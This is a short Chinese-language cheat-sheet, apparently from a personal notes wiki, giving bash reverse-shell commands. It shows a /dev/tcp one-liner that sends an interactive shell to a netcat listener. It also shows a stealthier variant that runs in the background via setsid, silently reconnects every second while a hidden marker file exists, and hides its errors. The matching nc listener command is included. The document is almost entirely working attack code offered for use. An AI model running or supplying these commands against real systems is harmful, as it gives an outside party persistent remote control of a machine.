bash反向shell

```shell
export IP="" PORT="" # nc监听的ip端口
bash -i >& /dev/tcp/$IP/$PORT 0>&1 # 直接运行

# 开新任务, 能后台运行, 自动重连
setsid bash -c 'touch /tmp/.bash-shell.keep; while test -f /tmp/.bash-shell.keep; do bash -i &> /dev/tcp/'$IP'/'$PORT' 0>&1; sleep 1 ; done' 2>/dev/null
# 停止自动重试连接, 不会自动关掉已经反弹的Shell
rm /tmp/.bash-shell.keep
```

nc监听
```shell
nc -l $PORT
```

相关:
[netcat](./netcat.md)